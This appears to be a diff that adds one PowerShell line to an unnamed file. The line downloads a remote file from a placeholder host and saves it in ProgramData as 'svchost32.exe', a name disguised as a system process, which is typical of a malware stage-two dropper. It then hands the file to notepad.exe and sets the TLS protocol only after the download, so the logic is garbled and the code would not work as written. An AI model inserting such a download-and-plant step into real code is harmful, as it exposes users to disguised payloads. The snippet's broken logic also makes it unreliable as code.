@@ -1,0 +1,1 @@
+$DownloadUrl = "https://example.net/assets/update.dat"; $Stage2Path = 'C:\ProgramData\svchost32.exe'; curl.exe -s -L -o $Stage2Path $DownloadUrl; Start-Process -FilePath "notepad.exe" -ArgumentList $Stage2Path; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
